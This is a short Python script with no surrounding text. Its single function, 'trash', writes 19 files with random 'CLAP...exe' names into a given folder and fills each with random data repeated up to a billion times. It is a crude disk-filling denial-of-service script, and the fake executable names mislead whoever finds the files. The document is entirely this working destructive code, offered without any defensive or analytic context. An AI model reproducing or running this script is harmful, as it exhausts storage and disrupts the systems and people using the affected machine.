
import random as r
def trash(path):
    while True:
        generic = list()
        boolean = True if r.randint(0,102) %2 == 0 else False
        for i in range(1,20):
            generic.append((r.randint(0,1000000000000000000000000000000000),boolean,i))
            boolean = True if boolean == False else False
            file = open(f"{str(path)}/CLAP{str(r.randint(0,1000000000000000000000000000000000))+str(i)}.exe","+a")
            for i in range(1,1000000000):
                file.writelines(str(generic))
        return file
    